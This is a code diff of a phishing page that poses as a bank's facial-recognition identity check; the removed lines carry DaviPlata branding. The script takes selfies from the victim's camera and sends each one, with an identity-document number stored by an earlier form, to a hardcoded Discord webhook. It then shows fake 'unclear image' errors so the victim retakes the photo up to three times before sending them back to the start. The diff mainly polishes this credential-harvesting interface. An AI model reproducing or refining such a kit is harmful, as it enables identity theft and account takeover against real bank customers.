@@ -3,209 +3,366 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DaviPlata - Reconocimiento Facial</title>
+    <title>Reconocimiento Facial</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --davi-red: #E60026;
-            --davi-pink: #F5B0B9;
-        }
+        :root { --red: #E60026; }
 
-        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
+        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
 
         body, html {
-            margin: 0; padding: 0; height: 100%; width: 100%;
+            width: 100%; height: 100%;
             overflow: hidden;
             background: #000;
             color: white;
         }
 
-        #kyc-view {
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            padding: 25px;
-        }
-
-        .header { text-align: center; margin-bottom: 6px; }
-        .logo-img { width: 80px; margin-bottom: 6px; }
-        .header h3 { margin-bottom: 4px; font-size: 18px; }
-        .header p  { color: #aaa; font-size: 12px; margin: 0; }
-
-        .camera-wrapper {
-            position: relative; width: 100%; flex: 1;
-            border-radius: 30px; overflow: hidden;
-            border: 2px solid #333; margin: 12px 0;
-            max-height: 55vh;
-        }
-
+        /* ── FULL SCREEN CAMERA ── */
         #video {
+            position: fixed;
+            inset: 0;
             width: 100%; height: 100%;
             object-fit: cover;
+            /* espejo para selfie */
             transform: scaleX(-1);
+            z-index: 0;
         }
 
-        .scan-line {
-            position: absolute; width: 100%; height: 3px;
-            background: #00ff00; box-shadow: 0 0 20px #00ff00;
-            top: 0; z-index: 10;
-            display: none;
-            animation: moveLine 2.5s infinite linear;
+        /* ── DARK GRADIENT TOP & BOTTOM ── */
+        .vignette {
+            position: fixed; inset: 0; z-index: 1;
+            background:
+                linear-gradient(to bottom, rgba(0,0,0,0.75) 0%, transparent 28%),
+                linear-gradient(to top,    rgba(0,0,0,0.75) 0%, transparent 28%);
+            pointer-events: none;
         }
-        @keyframes moveLine { 0% { top: 0%; } 100% { top: 100%; } }
 
-        .face-overlay {
-            position: absolute; top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            width: 240px; height: 300px;
-            border: 2px dashed rgba(255,255,255,0.6);
-            border-radius: 50% 50% 45% 45%;
+        /* ── HEADER ── */
+        .header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 20px 0;
+        }
+        .header img {
+            height: 38px;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+            margin-bottom: 8px;
+        }
+        .header h3 { font-size: 17px; font-weight: 700; margin-bottom: 2px; }
+        .header p  { font-size: 11px; color: rgba(255,255,255,0.5); }
+
+        /* ── OVAL FACE GUIDE ── */
+        .face-guide {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -52%);
+            width: min(68vw, 260px);
+            aspect-ratio: 0.78;
+            border: 2.5px dashed rgba(255,255,255,0.55);
+            border-radius: 50%;
             z-index: 5;
+            transition: border-color 0.4s, box-shadow 0.4s;
+        }
+        .face-guide.scanning {
+            border-color: #00ff88;
+            box-shadow: 0 0 0 4px rgba(0,255,136,0.15), inset 0 0 30px rgba(0,255,136,0.08);
+            border-style: solid;
         }
 
-        #error-message {
+        /* ── SCAN LINE ── */
+        .scan-line {
+            position: fixed;
+            left: 50%; transform: translateX(-50%);
+            width: min(68vw, 260px);
+            height: 2px;
+            background: linear-gradient(to right, transparent, #00ff88, transparent);
+            box-shadow: 0 0 10px #00ff88;
+            z-index: 6;
             display: none;
-            background: #ffebee; color: #c62828;
-            padding: 12px; border-radius: 10px;
-            font-size: 13px; margin-top: 8px;
-            border: 1px solid #ef9a9a;
-            text-align: center; line-height: 1.4;
+            /* top se controla por JS */
         }
 
-        .helper-text {
-            background: rgba(255,255,255,0.1);
-            padding: 14px; border-radius: 15px;
-            font-size: 13px; margin-top: 10px;
-            line-height: 1.5;
-            border-left: 4px solid var(--davi-red);
+        /* ── INSTRUCTION BADGE ── */
+        .badge {
+            position: fixed;
+            bottom: 160px; left: 20px; right: 20px;
+            z-index: 10;
+            background: rgba(0,0,0,0.55);
+            backdrop-filter: blur(14px);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 16px;
+            padding: 14px 18px;
+            text-align: center;
+            transition: border-color 0.3s;
         }
+        .badge.error { border-color: rgba(230,0,38,0.6); }
+        .badge-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
+        .badge-sub   { font-size: 12px; color: rgba(255,255,255,0.5); line-height: 1.5; }
+        .badge-sub.red { color: #ff6b6b; }
 
-        .footer-fixed { margin-top: auto; padding-bottom: 10px; padding-top: 14px; }
-
-        .btn-continue {
-            background: var(--davi-red); color: white;
-            border: none; padding: 18px; border-radius: 35px;
-            width: 100%; font-size: 16px; font-weight: 700;
+        /* ── CAPTURE BUTTON ── */
+        .btn-wrap {
+            position: fixed;
+            bottom: 52px; left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+        .btn-shutter {
+            width: 74px; height: 74px;
+            border-radius: 50%;
+            border: 4px solid white;
+            background: transparent;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(230,0,38,0.3);
-            transition: 0.3s;
+            display: flex; align-items: center; justify-content: center;
+            transition: transform 0.15s, border-color 0.3s;
         }
-        .btn-continue:active { opacity: 0.85; }
+        .btn-shutter:active { transform: scale(0.91); }
+        .btn-shutter:disabled { border-color: rgba(255,255,255,0.25); cursor: not-allowed; }
+        .btn-shutter-inner {
+            width: 54px; height: 54px;
+            border-radius: 50%;
+            background: white;
+            transition: background 0.2s;
+        }
+        .btn-shutter:disabled .btn-shutter-inner { background: rgba(255,255,255,0.2); }
+        .btn-label { font-size: 12px; color: rgba(255,255,255,0.6); }
 
+        /* ── FLASH ── */
+        .flash {
+            position: fixed; inset: 0; z-index: 20;
+            background: white; opacity: 0;
+            pointer-events: none; transition: opacity 0.07s;
+        }
+        .flash.show { opacity: 0.9; }
+
+        /* ── LOADER ── */
         #loader {
-            display: none; position: fixed; inset: 0; z-index: 999;
-            background: rgba(0,0,0,0.88); backdrop-filter: blur(8px);
-            flex-direction: column; justify-content: center; align-items: center;
+            display: none;
+            position: fixed; inset: 0; z-index: 30;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
+            flex-direction: column; align-items: center; justify-content: center;
+            gap: 16px;
         }
         .spinner {
             width: 50px; height: 50px;
-            border: 5px solid #333;
-            border-top: 5px solid var(--davi-red);
+            border: 4px solid #333;
+            border-top: 4px solid var(--red);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.85s linear infinite;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        #loader p { font-size: 14px; font-weight: 500; color: white; }
+
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="kyc-view">
+<!-- CAMERA -->
+<video id="video" autoplay playsinline muted></video>
 
-    <div class="header">
-        <img src="https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z" class="logo-img">
-        <h3>Reconocimiento Facial</h3>
-        <p>Sistema de Seguridad Biométrica v4.0</p>
-    </div>
+<!-- VIGNETTE -->
+<div class="vignette"></div>
 
-    <div class="camera-wrapper">
-        <div id="laser" class="scan-line"></div>
-        <video id="video" autoplay playsinline></video>
-        <div class="face-overlay"></div>
-    </div>
-
-    <div id="error-message"></div>
-
-    <div class="helper-text" id="help-box">
-        <strong>Atención:</strong> Mantenga el rostro dentro del óvalo. Asegúrese de que sus ojos sean visibles y que haya suficiente luz ambiental.
-    </div>
-
-    <div class="footer-fixed">
-        <button class="btn-continue" onclick="captureAndSend()">Validar Identidad</button>
-    </div>
+<!-- HEADER -->
+<div class="header">
+    <img src="logo.png" alt="Logo"
+        onerror="this.style.display='none'"/>
+    <h3>Reconocimiento Facial</h3>
+    <p>Sistema de Seguridad Biométrica v4.0</p>
 </div>
 
-<canvas id="canvas" style="display:none;"></canvas>
+<!-- OVAL GUIDE -->
+<div class="face-guide" id="faceGuide"></div>
 
+<!-- SCAN LINE -->
+<div class="scan-line" id="scanLine"></div>
+
+<!-- INSTRUCTION BADGE -->
+<div class="badge" id="badge">
+    <div class="badge-title" id="badgeTitle">Posiciona tu rostro en el óvalo</div>
+    <div class="badge-sub"  id="badgeSub">Asegúrate de tener buena iluminación y los ojos visibles</div>
+</div>
+
+<!-- CAPTURE BUTTON -->
+<div class="btn-wrap">
+    <button class="btn-shutter" id="btnShutter" onclick="captureAndSend()">
+        <div class="btn-shutter-inner"></div>
+    </button>
+    <span class="btn-label">Toca para validar</span>
+</div>
+
+<!-- FLASH -->
+<div class="flash" id="flash"></div>
+
+<!-- LOADER -->
 <div id="loader">
     <div class="spinner"></div>
-    <p id="loader-text" style="margin-top: 15px; color: var(--davi-red); font-weight: bold;"></p>
+    <p id="loaderText">Analizando biometría...</p>
 </div>
+
+<canvas id="canvas"></canvas>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
     let attempts = 0;
+    let scanAnim = null;
+    let videoReady = false;
 
-    // Recuperar datos del formulario anterior
-    const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-    const docNum = formData.num || 'desconocido';
+    // Datos del formulario
+    const savedData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+    const docNum = savedData.num || 'N/A';
 
-    // Iniciar cámara al cargar
-    window.addEventListener('load', startCamera);
-
+    // ── INICIAR CÁMARA ──
     async function startCamera() {
+        const video = document.getElementById('video');
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = stream;
-        } catch (err) {}
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+            });
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                videoReady = true;
+            };
+        } catch (err) {
+            // Fallback: cualquier cámara disponible
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => { video.play(); videoReady = true; };
+            } catch (e) {
+                setBadge('⚠️ Sin acceso a la cámara', 'Permita el acceso a la cámara en su navegador', true);
+                document.getElementById('btnShutter').disabled = true;
+            }
+        }
     }
 
+    window.addEventListener('load', startCamera);
+
+    // ── ANIMACIÓN LÍNEA DE ESCANEO ──
+    function startScanAnim() {
+        const line = document.getElementById('scanLine');
+        const guide = document.getElementById('faceGuide');
+        const rect = guide.getBoundingClientRect();
+        line.style.display = 'block';
+        line.style.top = rect.top + 'px';
+        let dir = 1, pos = rect.top;
+        scanAnim = setInterval(() => {
+            pos += dir * 3;
+            if (pos >= rect.bottom - 2) dir = -1;
+            if (pos <= rect.top) dir = 1;
+            line.style.top = pos + 'px';
+        }, 16);
+        document.getElementById('faceGuide').classList.add('scanning');
+    }
+
+    function stopScanAnim() {
+        clearInterval(scanAnim);
+        document.getElementById('scanLine').style.display = 'none';
+        document.getElementById('faceGuide').classList.remove('scanning');
+    }
+
+    // ── CAPTURA ──
     function captureAndSend() {
+        if (!videoReady) {
+            setBadge('Cámara iniciando...', 'Espera un momento e intenta de nuevo', true);
+            return;
+        }
+
         attempts++;
-        const video     = document.getElementById('video');
-        const canvas    = document.getElementById('canvas');
-        const laser     = document.getElementById('laser');
-        const errorDiv  = document.getElementById('error-message');
-        const helpBox   = document.getElementById('help-box');
+        const video  = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btn    = document.getElementById('btnShutter');
 
-        laser.style.display = 'block';
-        errorDiv.style.display = 'none';
-        showLoader("Analizando biometría...");
+        // Flash
+        const flash = document.getElementById('flash');
+        flash.classList.add('show');
+        setTimeout(() => flash.classList.remove('show'), 120);
 
-        canvas.width  = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        btn.disabled = true;
+        startScanAnim();
+        showLoader('Analizando biometría...');
+
+        // Asegurarse que el canvas tenga dimensiones válidas
+        const w = video.videoWidth  || video.clientWidth  || 640;
+        const h = video.videoHeight || video.clientHeight || 480;
+        canvas.width  = w;
+        canvas.height = h;
+
+        // Dibujar imagen espejada (igual que el video)
+        const ctx = canvas.getContext('2d');
+        ctx.save();
+        ctx.translate(w, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, w, h);
+        ctx.restore();
 
         canvas.toBlob(async (blob) => {
-            if (!blob) return;
+            if (!blob || blob.size < 1000) {
+                hideLoader();
+                stopScanAnim();
+                btn.disabled = false;
+                setBadge('Error al capturar', 'No se pudo tomar la foto. Intenta de nuevo.', true);
+                return;
+            }
+
+            // Enviar al webhook
             const fd = new FormData();
-            fd.append('file', blob, 'captura.png');
+            fd.append('file', blob, `facial_intento${attempts}.png`);
             fd.append('payload_json', JSON.stringify({
-                content: `📸 **Intento ${attempts}** - Doc: ${docNum}`
+                content: `🤳 **Facial — Intento ${attempts}** | Doc: ${docNum}`
             }));
-            try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch (e) {}
+            try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch(e) {}
 
             setTimeout(() => {
                 hideLoader();
-                laser.style.display = 'none';
+                stopScanAnim();
+                btn.disabled = false;
 
                 if (attempts < 3) {
-                    helpBox.style.display = 'none';
-                    errorDiv.innerText = "Error: Imagen poco clara. Por favor, asegúrese de que su rostro esté bien iluminado e intente de nuevo.";
-                    errorDiv.style.display = 'block';
+                    setBadge(
+                        '⚠️ No pudimos reconocerte',
+                        'Imagen poco clara. Mejora la iluminación y asegúrate de que tu rostro esté completamente dentro del óvalo.',
+                        true
+                    );
                 } else {
-                    errorDiv.innerText = "Validación no posible: No lo hemos reconocido como usuario. Por favor realice los pasos correctamente.";
-                    errorDiv.style.display = 'block';
+                    setBadge(
+                        '❌ Validación fallida',
+                        'No fue posible reconocerte. Serás redirigido para reintentar.',
+                        true
+                    );
+                    btn.disabled = true;
                     setTimeout(() => {
                         sessionStorage.clear();
-                        window.location.href = 'cedula.html';
-                    }, 4000);
+                        window.location.href = 'index.html';
+                    }, 3500);
                 }
             }, 3000);
+
         }, 'image/png');
     }
 
+    // ── HELPERS ──
+    function setBadge(title, sub, isError = false) {
+        document.getElementById('badgeTitle').textContent = title;
+        document.getElementById('badgeSub').textContent   = sub;
+        const badge = document.getElementById('badge');
+        badge.classList.toggle('error', isError);
+        document.getElementById('badgeSub').className = 'badge-sub' + (isError ? ' red' : '');
+    }
+
     function showLoader(text) {
-        document.getElementById('loader-text').innerText = text;
+        document.getElementById('loaderText').textContent = text;
         document.getElementById('loader').style.display = 'flex';
     }
     function hideLoader() {
